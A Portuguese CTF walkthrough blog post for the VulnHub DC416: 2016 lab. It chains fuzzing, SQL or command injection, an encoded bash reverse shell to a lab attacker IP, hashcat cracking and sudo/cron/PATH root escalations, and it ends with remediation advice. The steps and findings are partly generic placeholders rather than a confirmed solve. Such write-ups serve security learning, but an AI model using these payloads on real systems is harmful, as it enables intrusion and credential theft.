# VulnHub DC416: 2016 — Toronto Ligou, Quer o CTF de Volta

Ixi rapaziada!! DC416 e a conferencia estilo DEF CON realizada em Toronto, e a maquina CTF deles de 2016 e uma das caixas web-heavy mais divertidas que voce vai encontrar no VulnHub. Multiplas flags, fuzzing web intensivo, SQL injection ou command injection escondidos em lugares inesperados, cracking de hashes e escalacao de privilegios via misconfiguracoes de ambiente que espelham o tradecraft de exploracao web documentado de atores de estado em 2016. Se voce acompanhou as apresentacoes sobre o hack do DNC pelo APT28 naquele ano, parte disso vai soar muito familiar. Maquina top demais no geral.

Parabens ao **time DC416** por open-sourcear o CTF da conferencia como entry no VulnHub. Transformar uma competicao de conferencia em recurso de aprendizado e exatamente o tipo de coisa que impulsiona a comunidade pra frente.

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Intermediario |
| **VM Alvo** | DC416: 2016 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/dc416-2016,231/ |
| **Tecnicas** | Host discovery, Nmap, Web fuzzing (gobuster/wfuzz), SQL injection, Command injection, Cracking de hashes de senha, Escalacao de privilegios via misconfiguracao |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), CWE-78 (OS Command Injection, OWASP A03:2021), T1548.003 (Misconfiguracao de sudo) |

---

## Resumo do Ataque

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache, 22/tcp SSH, possíveis outras portas]
    |
    v
[gobuster/wfuzz: fuzzing web extensivo -> dirs e params ocultos]
    |
    v
[aplicacao web: vulnerabilidade de SQL injection ou command injection]
    |
    v
[execucao de codigo / divulgacao de informacao -> hashes extraídos]
    |
    v
[hashcat GPU: crackear hashes de senha extraídos]
    |
    v
[SSH ou login local com credenciais crackeadas]
    |
    v
[privesc: sudo mal configurado / script com escrita / variavel de ambiente]
    |
    v
[ROOT / todas as flags capturadas]
```

---

## Metodologia

1. Host discovery e identificacao da rede
2. Scan Nmap completo: servicos, versoes, fingerprinting de OS
3. Fuzzing web extensivo com gobuster e wfuzz (diretorios, parametros, extensoes)
4. Analise da aplicacao web: identificar pontos de injecao
5. Exploracao de SQL injection ou command injection
6. Extrair e crackear hashes de senha com hashcat via GPU
7. Autenticar com credenciais crackeadas
8. Escalacao de privilegios via sudo mal configurado, scripts com escrita ou variaveis de ambiente
9. Capturar todas as flags

---

## Passo 1 — Identificando o Alvo

Startup padrao de boot2root: localizar a VM na rede.

```bash
route -n
# Identificar sub-rede atual, ex.: 192.168.56.0/24
```

```bash
# arp-scan rapido
arp-scan --localnet --ignoredups

# Alternativa: nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Saida esperada:

```
192.168.56.103   08:00:27:XX:XX:XX   VirtualBox
```

OBS.: Anota o IP. Usamos `TARGET=192.168.56.103` ao longo do writeup.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Passo 2 — Enumeracao de Servicos Nmap

Scaneie tudo. CTFs de conferencias adoram esconder servicos em portas incomuns.

```bash
nmap -A -T4 -p- 192.168.56.103
# -A: OS, deteccao de versao, scripts, traceroute
# -T4: timing agressivo
# -p-: todas as 65535 portas
```

Saida esperada:

```
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.x
# Possivelmente portas adicionais dependendo da configuracao do desafio
```

O servidor web e nossa superficie de ataque principal. Vamos sonda-lo.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Network Service Discovery]

---

## Passo 3 — Fuzzing Web Agressivo

> **O que e web fuzzing?**
> Web fuzzing e o processo de enviar sistematicamente muitos inputs ou nomes de caminho diferentes para uma aplicacao web a fim de descobrir endpoints, parametros e funcionalidades ocultos que nao estao linkados na navegacao principal. E um passo essencial em pentest de aplicacoes web e a tecnica que o APT28 (Fancy Bear) usou extensivamente durante as intrusoes relacionadas a eleicao de 2016 para mapear infraestrutura web comprometida antes de explora-la.
> Referencia: https://owasp.org/www-project-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver

Comece com um scan amplo de diretorios:

```bash
gobuster dir \
    -u http://192.168.56.103 \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,zip,conf \
    -t 50 \
    -o /tmp/dc416_gobuster.txt
# -x: buscando tambem arquivos de backup e configuracao
```

Para fuzzing de parametros (quando encontrar um endpoint que aceita parametro):

```bash
wfuzz -c \
    -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    --hc 404 \
    "http://192.168.56.103/index.php?FUZZ=test"
```

Fuzzing recursivo profundo com feroxbuster:

```bash
feroxbuster \
    -u http://192.168.56.103 \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -x php,txt,html,bak \
    --depth 3 \
    -t 50 \
    -o /tmp/dc416_feroxbuster.txt
```

Descobertas esperadas (representativas):

```
/admin/           (Status: 200 ou 301)
/login.php        (Status: 200)
/flag/            (Status: 200 ou 403)
/db.php           (Status: 500 - revela erro)
/config.php.bak   (Status: 200 - exposicao de arquivo de backup!)
```

ԅ(≖‿≖ԅ) Arquivos de backup e paineis admin. Configuracao web classica era 2016.

> **Nota do mundo real:** Fuzzing web foi central na metodologia do APT28 durante as intrusoes ao DNC e DCCC em 2016. O grupo usou ferramentas de scanning automatizado para enumerar diretorios de aplicacoes web e identificar endpoints exploravel antes de deployar seu implante X-Agent. O indiciamento do Relatorio Mueller (julho 2018) detalha como a Unidade GRU 26165 usou essas tecnicas contra a infraestrutura do Partido Democratico. Referencia: https://www.justice.gov/storage/report.pdf

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1083 File and Directory Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Passo 4 — Exploracao de SQL Injection ou Command Injection

Baseado no que o fuzzing revelar, voce vai encontrar um dos dois principais pontos de injecao. Vamos cobrir ambos.

**Cenario A: SQL Injection**

> **O que e SQL Injection?**
> Dados fornecidos pelo usuario sao concatenados diretamente em uma query SQL. O atacante quebra o contexto da string e executa SQL arbitrario, podendo ler o banco inteiro ou escrever arquivos em disco.
> CWE-89: https://cwe.mitre.org/data/definitions/89.html

Se encontrar um formulario de login ou parametro de busca, teste:

```bash
# Teste de aspas simples
curl -s "http://192.168.56.103/login.php" \
    --data "username='&password=test" | grep -i "error\|sql\|syntax"

# Exploracao automatizada com sqlmap
sqlmap -u "http://192.168.56.103/login.php" \
    --data "username=admin&password=test" \
    --dbms=mysql \
    --dump \
    --batch \
    --level=3 \
    --risk=2 \
    --output-dir=/tmp/dc416_sqlmap
```

**Cenario B: OS Command Injection**

> **O que e Command Injection?**
> Quando input do usuario e passado diretamente para um comando shell do sistema (via `system()`, `exec()`, backticks, etc.) sem sanitizacao, o atacante pode injetar comandos OS adicionais. Isso e OWASP A03:2021 e mapeia para CWE-78.
> CWE-78: https://cwe.mitre.org/data/definitions/78.html

Se encontrar um parametro que parece executar algo (ping, lookup, DNS check, operacao de arquivo):

```bash
# Teste com encadeamento por ponto-e-vírgula
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1;id"

# Teste com pipe
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1|id"

# Se RCE confirmado, pegue um reverse shell:
# Inicie o listener primeiro:
# nc -lvnp 4444
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/192.168.56.100/4444 0>&1\"'))")
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1%3B${ENCODED}"
```

Para confirmar command injection cego via delay:

```bash
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1;sleep+5" --max-time 10
# Se a resposta demorar 5+ segundos, injecao cega confirmada
```

Saida esperada quando bem-sucedido:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

(☞ﾟヮﾟ)☞ Execucao de codigo confirmada.

> **Nota do mundo real:** SQL injection foi a tecnica principal por tras da brecha do DCCC (Democratic Congressional Campaign Committee) em 2016. Vulnerabilidades de command injection foram amplamente exploradas em 2016 por multiplos atores de ameaca. A intrusao do APT28 ao DCCC dependeu de exploracao de aplicacoes web para foothold inicial antes de pivotar para coleta de credenciais. Referencia: https://intelligence.house.gov/uploadedfiles/hpsci_hacking_campaign_ih3.pdf

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0002 Execution] [T1059.004 Unix Shell]

---

## Passo 5 — Extracao e Cracking de Hashes de Senha

Apos obter acesso ou fazer dump do banco, voce provavelmente vai encontrar senhas hasheadas. Vamos cracke-las.

**Extraia hashes do dump do banco:**

```bash
# Se usou sqlmap, verifique o diretorio de output
cat /tmp/dc416_sqlmap/*/dump/*/*.csv 2>/dev/null

# Se tiver shell, busque arquivos de configuracao
find / -name "*.php" -exec grep -l "password\|mysql_connect\|PDO" {} \; 2>/dev/null | head -10
cat /var/www/html/config.php
```

**Identifique o tipo de hash:**

```bash
hashid '<valor_do_hash>'
hash-identifier '<valor_do_hash>'
```

**Crackeie com hashcat usando GPU (RTX 4060):**

```bash
# Primeiro verifique o potfile
hashcat -m <MODO> /tmp/dc416_hashes.txt --show

# MD5 (modo 0)
hashcat -m 0 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1 (modo 100)
hashcat -m 100 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (modo 3200), mais lento
hashcat -m 3200 -d 1 -w 2 /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# Se wordlist pura falhar, adicione best64.rule
hashcat -m 0 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

Saida esperada:

```
<hash>:<senha_em_texto_puro>
                                                 
Session..........: hashcat
Status...........: Cracked
Recovered........: 1/1 (100.00%)
```

ᕕ( ᐛ )ᕗ Senha em texto puro capturada. Agora vamos autenticar.

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110 Brute Force] [T1003 OS Credential Dumping]

---

## Passo 6 — Autenticacao e Movimento Lateral

Use as credenciais crackeadas pra autenticar via SSH ou na aplicacao web:

```bash
# SSH com credenciais crackeadas
ssh <usuario>@192.168.56.103

# Verifique outros usuarios
cat /etc/passwd | grep -v "nologin\|false"

# Verifique diretorios home
ls -la /home/
```

Se houver multiplos usuarios, procure por reuso de credenciais:

```bash
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
```

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1021.004 Remote Services: SSH] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Passo 7 — Escalacao de Privilegios

Verifique todos os vetores classicos:

```bash
# Permissoes sudo
sudo -l

# Binarios SUID
find / -perm -u=s -type f 2>/dev/null

# Cron jobs com escrita
ls -la /etc/cron*
cat /etc/crontab
find /etc/cron.d/ -writable 2>/dev/null

# Scripts com escrita executando como root
ps aux | grep root
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"

# Verificar exploracao de variavel de ambiente
env
echo $PATH
```

**Se sudo esta mal configurado (NOPASSWD num binario util):**

```bash
sudo find /tmp -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd
# (dentro do less: !/bin/bash)
```

**Se um script cron com escrita roda como root:**

```bash
echo "chmod +s /bin/bash" >> /caminho/para/script_cron_com_escrita.sh
# Aguardar execucao do cron, depois:
/bin/bash -p
```

**Se PATH hijacking e possivel:**

```bash
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Disparar o script executado como root
```

(☞ﾟヮﾟ)☞ Um desses vai abrir root. Verifique cada um sistematicamente.

> **Nota do mundo real:** Sudo mal configurado e scripts cron com escrita foram vetores de ataque documentados em numerosos comprometimentos enterprise em 2016. O hack do DNC pelo APT28 envolveu exploracao de servicos mal configurados apos ganhar acesso web inicial para pivotar pela rede. Misconfiguracoes de sudo aparecem no CIS Benchmark como achados criticos. Referencia: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Sudo] [T1053.003 Cron] [T1574.007 PATH Interception]

> **GTFOBins:** https://gtfobins.github.io/

---

## Passo 8 — Root e Todas as Flags

**ᕕ( ᐛ )ᕗ Conseguimos o root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Encontrar todas as flags
find / -name "*.txt" -path "*/flag*" 2>/dev/null
find / -name "flag*" 2>/dev/null
find / -name "proof*" 2>/dev/null

cat /root/flag.txt
```

```
Congratulations! You've completed the DC416 2016 CTF challenge.

FLAG: [dc416_flag_value_here]

Thanks for playing at DC416!
  -- The DC416 Team
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Crackeado / Usado |
|------|-------|---------------|-------------------|
| Hash (MD5/SHA1) | `<hash_do_banco>` | Dump do banco via SQLi ou arquivo de config | `<senha_crackeada>` |
| Credencial | `<usuario>:<senha>` | Banco / cracking de hash | Login SSH |
| Flag de usuario | `<valor_da_flag>` | `/home/<usuario>/flag.txt` | N/A |
| Flag root | `<flag_root>` | `/root/flag.txt` | N/A |

*Nota: Os valores exatos das flags dependem da instancia da VM. Os valores acima sao placeholders para documentacao do walkthrough.*

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | Endpoints ocultos descobertos via web fuzzing | Paineis admin sem link, arquivos de backup e endpoints de configuracao sao um achado persistente em auditorias web enterprise; a aplicacao media tem 30-40% de sua superficie nao alcancavel pela navegacao principal | Sempre incluir fuzzing automatizado de diretorios e parametros em engajamentos de aplicacoes web; atacantes vao encontrar o que voce perder |
| 2 | SQL injection ou command injection na aplicacao web | OWASP A03:2021 (Injection) e consistentemente um dos 3 principais classes de vulnerabilidade web; APT28 usou SQLi como vetor de acesso inicial na brecha do DCCC em 2016 | Parametrize todas as queries; nunca concatene input do usuario em SQL ou comandos shell; implemente WAF como controle compensatorio |
| 3 | Hashes de senha crackeáveis armazenados no banco | Hashing fraco (MD5, SHA1, sem salt) permite cracking offline via GPU em minutos a horas; mais de 14 bilhoes de pares plaintext:hash estao em bancos de dados publicos | Use bcrypt, Argon2 ou scrypt para armazenamento de senhas; enforce politicas de senha forte (minimo 12 caracteres, complexidade) |
| 4 | Escalacao de privilegios via sudo ou misconfiguracao de cron | O achado interno mais comum em testes de penetracao enterprise; uma unica linha mal configurada no sudoers em qualquer servidor da ao atacante controle total do sistema | Auditoria regular de sudo: `sudo -l` em todas as contas; revisar scripts de cron quanto a permissoes de escrita; aplicar principio do menor privilegio |

**Por que isso importa alem do lab?**

A maquina DC416 2016 espelha diretamente o tradecraft de exploracao web documentado na atribuicao do governo americano da campanha de interferencia eleitoral de 2016 a Unidade GRU 26165 (APT28/Fancy Bear). O Relatorio Mueller e os advisories subsequentes da CISA descrevem acesso inicial via exploracao de aplicacoes web, seguido de roubo de credenciais e movimento lateral, exatamente a chain que esta VM apresenta. Fuzzing web para encontrar endpoints ocultos, injetar em parametros descobertos, crackear hashes extraídos e explorar misconfiguracoes de escalacao de privilegios: nao sao apenas tecnicas de CTF. Sao os passos documentados de uma das operacoes ciberneticas mais significativas da ultima decada.

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | Software Discovery | T1518 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application (SQLi/CMDi) | T1190 |
| Execucao | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Acesso a Credenciais | TA0006 | Brute Force (cracking de hash) | T1110 |
| Acesso a Credenciais | TA0006 | OS Credential Dumping | T1003 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Movimento Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Escalacao de Privilegios | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Escalacao de Privilegios | TA0004 | Scheduled Task/Job: Cron | T1053.003 |
| Escalacao de Privilegios | TA0004 | Path Interception by PATH Variable | T1574.007 |
| Coleta | TA0009 | Data from Local System (flags) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. Substituir toda concatenacao SQL por queries parametrizadas; implementar WAF com regras de deteccao de injecao
2. Sanitizar todo input do usuario antes de passar para funcoes OS; se comandos OS forem necessarios, usar allowlisting estrito de valores permitidos
3. Atualizar hashing de senhas para bcrypt (custo 12+) ou Argon2id; forcar reset de senha para todas as contas usando algoritmos fracos
4. Auditar arquivos sudoers: `visudo` e remover todas as entradas NOPASSWD para ferramentas interativas; implementar logging de sudo
5. Revisar todos os scripts de cron job quanto a permissoes de escrita para todos: `stat /caminho/para/script.sh`; garantir que scripts cron sejam de propriedade e graváveis apenas pelo root
6. Limpar arquivos de backup regularmente: garantir que arquivos `.bak`, `.old`, `.conf`, `.zip` nao sejam acessiveis pela web

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Isolar servidor web afetado e revisar logs de acesso em busca de sinais de exploracao anterior
- Rotacionar todas as credenciais de banco e chaves de API da aplicacao
- Revogar e regenerar chaves SSH de todos os usuarios no host comprometido
- Executar `find / -perm -u=s -type f 2>/dev/null` e comparar contra baseline conhecido
- Revisar cron jobs em busca de modificacoes nao autorizadas: `diff /etc/crontab /backup/crontab`

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation Analysis) para T1190 SQLi e command injection
- D3-SJA (Scheduled Job Analysis) para T1053.003 persistencia/privesc via cron
- D3-OPS (OS Process Sandboxing) para T1548.003 abuso de sudo
- D3-CH (Credential Hardening) para T1110 ataques de cracking de hash

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Manter inventario de aplicacoes web incluindo todos os endpoints expostos e arquivos de backup
- Protect (PR.DS-2): Validar todo input; enforcar padroes de codificacao segura em equipes de desenvolvimento
- Protect (PR.AC-4): Enforcar menor privilegio para todas as contas de servico e configuracoes sudo
- Detect (DE.CM-7): Monitorar logs de aplicacoes web em busca de padroes de injecao
- Respond (RS.AN-1): Estabelecer procedimentos de coleta forense e analise para incidentes em aplicacoes web

**Controles NIST SP 800-53 (Rev. 5):**
- SI-10: Information Input Validation (prevencao de injecao)
- AC-6: Least Privilege (hardening de sudo e cron)
- IA-5: Authenticator Management (hashing forte de senhas)
- CM-7: Least Functionality (remover scripts desnecessarios com permissoes elevadas)
- AU-12: Audit Record Generation (logar todas as execucoes sudo e cron)

**CISA Known Exploited Vulnerabilities:**
- Multiplos CVEs de SQL injection relevantes para Apache e aplicacoes PHP aparecem no catalogo CISA KEV
- TTPs atribuídas ao APT28 sao documentadas no CISA Alert AA20-296A
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Dominio: TECHNOLOGY
- Pratica: Vulnerability Management e Configuration Management
- MIL Alvo: MIL-2 (aplicacao consistente de baselines de configuracao segura e SLAs de remediacao de vulnerabilidades)

---

## Consideracoes Finais

Valeu ao **time DC416** por converter o CTF da conferencia de 2016 em um recurso de aprendizado disponivel publicamente. A maquina captura o zeitgeist de exploracao web daquele ano perfeitamente, incluindo as tecnicas que apareceram em operacoes reais de atores de ameaca durante o mesmo periodo.

Tem algo poeticamente pertinente em usar um CTF de conferencia de 2016 para estudar as tecnicas documentadas no indiciamento da GRU de 2016. A distancia entre "caixa CTF" e "ataque real" sempre foi menor do que as pessoas pensam. Um scan, um fuzz, uma injecao, um hash crackeado, uma misconfiguracao de sudo: nao e exotico. E apenas trabalho paciente e metodico.

Seja voce fazendo isso para preparacao para OSCP, conscientizacao de blue team, ou simplesmente porque ama o grind: DC416 entrega o que promete. Compartilha com a galera e continua na luta!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [Andre Henrique](https://medium.com/@mrhenrike) | [Uniao Geek](https://uniaogeek.com.br)*
